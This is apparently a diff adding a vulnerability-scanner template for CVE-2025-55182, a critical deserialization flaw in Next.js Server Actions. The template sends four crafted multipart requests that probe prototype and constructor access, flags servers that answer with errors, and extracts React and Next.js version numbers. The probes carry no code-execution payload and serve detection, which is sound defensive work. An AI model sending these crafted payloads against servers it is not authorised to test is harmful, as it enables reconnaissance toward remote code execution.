@@ -1,0 +1,115 @@
+id: CVE-2025-55182
+
+info:
+  name: Next.js Server Actions RCE - CVE-2025-55182
+  author: Allan Kimmer Jensen
+  severity: critical
+  description: |
+    Remote code execution vulnerability in React Server Components and Next.js Server Actions.
+    The vulnerability allows unauthenticated attackers to execute arbitrary code on the server
+    through insecure deserialization in the Flight protocol.
+  reference:
+    - https://react.dev/blog/2025/12/03/critical-security-vulnerability
+    - https://github.com/facebook/react/commit/7dc903cd29
+    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-55182
+    - https://www.wiz.io/blog/critical-vulnerability-in-react-cve-2025-55182
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 10.0
+    cve-id: CVE-2025-55182
+    cwe-id: CWE-502
+  metadata:
+    max-request: 4
+  tags: cve,cve2025,nextjs,react,rce,deserialization
+
+http:
+  - raw:
+      # Test 1: Basic path traversal
+      - |
+        POST {{BaseURL}} HTTP/1.1
+        Host: {{Hostname}}
+        Next-Action: 1337
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+
+        ------WebKitFormBoundary
+        Content-Disposition: form-data; name="0"
+
+        ["$1:a:a"]
+        ------WebKitFormBoundary
+        Content-Disposition: form-data; name="1"
+
+        "{}"
+        ------WebKitFormBoundary--
+
+      # Test 2: Constructor access
+      - |
+        POST {{BaseURL}} HTTP/1.1
+        Host: {{Hostname}}
+        Next-Action: 1337
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+
+        ------WebKitFormBoundary
+        Content-Disposition: form-data; name="0"
+
+        ["$1:constructor"]
+        ------WebKitFormBoundary
+        Content-Disposition: form-data; name="1"
+
+        "{}"
+        ------WebKitFormBoundary--
+
+      # Test 3: Prototype pollution attempt
+      - |
+        POST {{BaseURL}} HTTP/1.1
+        Host: {{Hostname}}
+        Next-Action: 1337
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+
+        ------WebKitFormBoundary
+        Content-Disposition: form-data; name="0"
+
+        ["$1:__proto__:toString"]
+        ------WebKitFormBoundary
+        Content-Disposition: form-data; name="1"
+
+        "{}"
+        ------WebKitFormBoundary--
+
+      # Test 4: Deep traversal
+      - |
+        POST {{BaseURL}} HTTP/1.1
+        Host: {{Hostname}}
+        Next-Action: 1337
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+
+        ------WebKitFormBoundary
+        Content-Disposition: form-data; name="0"
+
+        ["$1:a:b:c:d:e"]
+        ------WebKitFormBoundary
+        Content-Disposition: form-data; name="1"
+
+        "{}"
+        ------WebKitFormBoundary--
+
+    stop-at-first-match: true
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+
+      - type: word
+        part: body
+        words:
+          - "Error"
+        condition: or
+
+    extractors:
+      - type: regex
+        part: body
+        group: 1
+        regex:
+          - 'react[^"]*"([0-9]+\.[0-9]+\.[0-9]+)"'
+          - 'next[^"]*"([0-9]+\.[0-9]+\.[0-9]+)"'
